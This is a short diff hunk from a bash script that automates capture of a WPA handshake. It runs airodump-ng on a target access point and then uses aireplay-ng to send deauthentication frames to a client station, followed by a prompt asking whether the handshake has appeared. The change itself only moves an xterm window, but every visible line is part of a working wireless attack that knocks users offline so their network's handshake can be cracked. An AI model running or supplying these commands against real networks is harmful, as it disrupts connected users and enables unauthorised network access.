@@ -671,7 +671,7 @@ fi
 xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+0 -hold -e airodump-ng --bssid $BSSID -c $Channel -w output $monitor &
 # Insert aireplay code here for hidden networks
 sleep 10
-xterm -bg blue -fg white -fn 10x20 -geometry 94x12+965+334 -hold -title "Deauthentication" -e aireplay-ng --deauth 10 -a $BSSID -c $STATION $monitor &
+xterm -bg blue -fg white -fn 10x20 -geometry 94x12+965+345 -hold -title "Deauthentication" -e aireplay-ng --deauth 10 -a $BSSID -c $STATION $monitor &
 sleep 30
 
 zenity --question --text "Look in the airodump-ng window.  Has a WPA handshake occured? If not, continue to wait. If so, click Yes."
